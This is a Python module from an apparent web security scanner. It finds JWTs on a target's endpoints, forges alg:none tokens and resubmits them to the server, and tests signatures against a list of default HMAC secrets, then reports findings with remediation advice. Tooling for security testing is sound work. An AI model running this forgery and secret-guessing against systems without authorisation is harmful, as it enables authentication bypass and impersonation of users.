"""
JWTModule — GhostRecon module.
Analyzes JSON Web Tokens (JWT) for security misconfigurations, and actively
attempts to exploit them (not just report the static config):
  - alg:none forgery, resubmitted against the endpoint that issued the token
  - weak/default HMAC secret brute-force (cryptographic proof via PyJWT,
    no live request needed — a successful local verify IS the exploit)
"""
import re
import json
import base64

try:
    import requests
except ImportError:
    requests = None

try:
    import jwt as pyjwt
except ImportError:
    pyjwt = None

from modules import BaseModule


# Small set of textbook-weak / commonly-forgotten-default HMAC secrets.
# Deliberately short — this is a misconfiguration check, not a real
# brute-force attack against a production secret.
WEAK_SECRETS = [
    "secret", "password", "123456", "changeme", "jwt_secret",
    "your-256-bit-secret", "key", "test", "admin", "qwerty",
]


class JWTModule(BaseModule):
    NAME = "JWT Analysis"

    JWT_REGEX = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*'

    def run(self):
        self.ui.section("JWT — JSON Web Token Security Analysis")
        if not requests:
            return

        # JWTs discovered from previous scans, mapped to the endpoint that
        # returned them so exploit attempts can be resubmitted there.
        jwt_sources = {}  # token -> endpoint

        self.session = self._session()
        endpoints = [self.base_url] + self.ctx.get("endpoints", [])[:10]

        for endpoint in endpoints:
            try:
                resp = self.session.get(endpoint, timeout=self.timeout)
                for match in re.finditer(self.JWT_REGEX, resp.text):
                    jwt_sources.setdefault(match.group(0), endpoint)
                for k, v in resp.headers.items():
                    for match in re.finditer(self.JWT_REGEX, v):
                        jwt_sources.setdefault(match.group(0), endpoint)
            except Exception:
                pass

        if not jwt_sources:
            self.ui.info("No JWT tokens discovered.")
            return

        self.ui.info(f"Discovered {len(jwt_sources)} JWT(s) for analysis.")

        for token, endpoint in jwt_sources.items():
            self._analyze_jwt(token, endpoint)

    def _pad_base64(self, data: str) -> str:
        """Add padding to base64 string if necessary."""
        return data + '=' * (4 - len(data) % 4)

    def _b64url_nopad(self, data: bytes) -> str:
        return base64.urlsafe_b64encode(data).decode().rstrip("=")

    def _forge_none_alg(self, payload: dict) -> str:
        """Build an alg:none JWT: {header}.{payload}. with an empty signature."""
        header_b64 = self._b64url_nopad(json.dumps({"alg": "none", "typ": "JWT"}).encode())
        payload_b64 = self._b64url_nopad(json.dumps(payload).encode())
        return f"{header_b64}.{payload_b64}."

    def _try_none_alg_exploit(self, token: str, payload: dict, endpoint: str):
        """Forge an alg:none token and resubmit it — does the server actually accept it?"""
        forged = self._forge_none_alg(payload)
        try:
            real_resp   = self.session.get(endpoint, timeout=self.timeout,
                                            headers={"Authorization": f"Bearer {token}"})
            forged_resp = self.session.get(endpoint, timeout=self.timeout,
                                            headers={"Authorization": f"Bearer {forged}"})
            noauth_resp = self.session.get(endpoint, timeout=self.timeout)
        except Exception:
            return None

        # The endpoint has to actually behave differently with vs without a
        # token for this to mean anything (otherwise it may not even be
        # checking auth on this endpoint, or the string we found isn't a
        # real session token at all).
        token_matters = (
            real_resp.status_code != noauth_resp.status_code
            or abs(len(real_resp.text) - len(noauth_resp.text)) > max(30, len(noauth_resp.text) * 0.05)
        )
        if not token_matters:
            return None

        forged_matches_real = (
            forged_resp.status_code == real_resp.status_code
            and abs(len(forged_resp.text) - len(real_resp.text)) <= max(30, len(real_resp.text) * 0.05)
        )
        if forged_matches_real:
            return forged
        return None

    def _try_weak_secret(self, token: str, alg: str):
        """Cryptographically verify the signature against a small list of
        default/weak secrets. A successful decode IS the proof — no live
        request needed."""
        if not pyjwt or alg not in ("HS256", "HS384", "HS512"):
            return None
        for secret in WEAK_SECRETS:
            try:
                # We're proving the SIGNATURE matches a weak secret, not that
                # the token is currently usable — don't let an expired `exp`
                # mask a correctly-guessed secret.
                pyjwt.decode(token, secret, algorithms=[alg], options={"verify_exp": False})
                return secret
            except Exception:
                continue
        return None

    def _analyze_jwt(self, token: str, endpoint: str):
        parts = token.split('.')
        if len(parts) != 3:
            return

        try:
            # Decode Header
            header_b64 = self._pad_base64(parts[0])
            header_json = base64.urlsafe_b64decode(header_b64).decode('utf-8')
            header = json.loads(header_json)

            # Decode Payload
            payload_b64 = self._pad_base64(parts[1])
            payload_json = base64.urlsafe_b64decode(payload_b64).decode('utf-8')
            payload = json.loads(payload_json)
        except Exception:
            return

        alg = header.get('alg', '').upper()

        # 1. alg:none forgery — actively exploited, not just detected. Runs
        # regardless of the token's own declared alg (this is the attacker
        # changing the header, not reading what's already there).
        accepted_forgery = self._try_none_alg_exploit(token, payload, endpoint)
        if accepted_forgery:
            self.db.add(
                title="JWT — 'alg:none' Forgery Accepted By Server",
                severity="critical", url=endpoint, module=self.NAME,
                description=(
                    "A forged JWT with header {\"alg\":\"none\"} and an empty signature, built "
                    "from this token's own payload, was accepted by the server as equivalent to "
                    "the original signed token. Anyone can forge arbitrary claims (e.g. admin=true) "
                    "with zero cryptographic knowledge."
                ),
                remediation="Explicitly reject 'none' as an accepted algorithm in the JWT verification library config. Pin the expected algorithm(s) server-side instead of trusting the token's own 'alg' header.",
                cvss="9.8",
                confidence="CONFIRMED",
                confidence_score=98,
                validation_steps=["jwt_parsed", "forged_none_alg_resubmitted", "server_accepted_forgery"],
                evidence=[f"Forged token: {accepted_forgery}", f"Tested against: {endpoint}"],
            )
            self.ui.find("critical", "JWT alg:none Forgery Accepted", endpoint)
        elif alg == 'NONE':
            # The token as originally issued already declares alg:none —
            # a real red flag on its own even though our live resubmission
            # above couldn't independently confirm impact at this endpoint.
            self.db.add(
                title="JWT — 'none' Algorithm In Issued Token",
                severity="critical", url=endpoint, module=self.NAME,
                description=(
                    "A token issued by the application itself uses the 'none' algorithm, "
                    "meaning it carries no cryptographic integrity protection at all — anyone "
                    "who can see one such token can forge arbitrary others."
                ),
                remediation="Reject JWTs with the 'none' algorithm. Always enforce signature verification.",
                cvss="9.1",
                confidence="HIGH",
                confidence_score=80,
                validation_steps=["jwt_parsed", "alg_none_in_issued_token"]
            )
            self.ui.find("critical", "JWT 'none' Algorithm", endpoint)

        # 1b. Weak/default HMAC secret — cryptographic proof via PyJWT.
        weak_secret = self._try_weak_secret(token, alg)
        if weak_secret:
            self.db.add(
                title=f"JWT — Weak HMAC Secret ('{weak_secret}')",
                severity="critical", url=endpoint, module=self.NAME,
                description=(
                    f"This {alg} token's signature verifies successfully against the common "
                    f"default/weak secret '{weak_secret}'. Anyone who knows this secret can "
                    "forge arbitrary valid tokens, including elevated-privilege claims."
                ),
                remediation="Use a long, random, unique HMAC secret (32+ bytes from a CSPRNG), or switch to asymmetric signing (RS256/ES256) if the secret must be shared across services.",
                cvss="9.8",
                confidence="CONFIRMED",
                confidence_score=99,
                validation_steps=["jwt_parsed", "hmac_signature_verified_with_known_secret"],
                evidence=[f"Secret: {weak_secret}"],
            )
            self.ui.find("critical", f"JWT Weak HMAC Secret: {weak_secret}", endpoint)
        elif not pyjwt and alg in ("HS256", "HS384", "HS512"):
            self.ui.warn("PyJWT not installed — skipping weak-HMAC-secret check (pip install pyjwt)")

        # 2. Check for missing expiration
        if 'exp' not in payload:
            self.db.add(
                title="JWT — Missing Expiration (exp) Claim",
                severity="medium", url=endpoint, module=self.NAME,
                description="The JWT payload does not contain an 'exp' claim. The token never expires.",
                remediation="Include a short-lived 'exp' claim in all JWTs.",
                cvss="5.3",
                confidence="HIGH",
                confidence_score=85,
                validation_steps=["jwt_parsed", "exp_missing"]
            )
            self.ui.find("medium", "JWT Missing exp claim", endpoint)

        # 3. Check for sensitive data in payload
        sensitive_keys = ['password', 'pwd', 'ssn', 'credit_card', 'secret', 'key']
        found_sensitive = [k for k in payload.keys() if any(sk in k.lower() for sk in sensitive_keys)]

        if found_sensitive:
            # List which keys carry sensitive data, not their raw values —
            # dumping the actual payload here would re-leak the very secrets
            # this finding is warning about into our own report output.
            self.db.add(
                title="JWT — Sensitive Data in Payload",
                severity="high", url=endpoint, module=self.NAME,
                description=(
                    f"The JWT payload contains potentially sensitive fields: {', '.join(found_sensitive)}. "
                    "JWT payloads are base64 encoded, not encrypted, and can be read by anyone."
                ),
                remediation="Never store sensitive information in JWT payloads. Use opaque tokens if necessary.",
                cvss="7.4",
                confidence="HIGH",
                confidence_score=90,
                validation_steps=["jwt_parsed", "sensitive_keys_matched"],
                evidence=[f"Sensitive field name(s) found: {', '.join(found_sensitive)}"]
            )
            self.ui.find("high", "JWT Sensitive Data Exposure", endpoint)
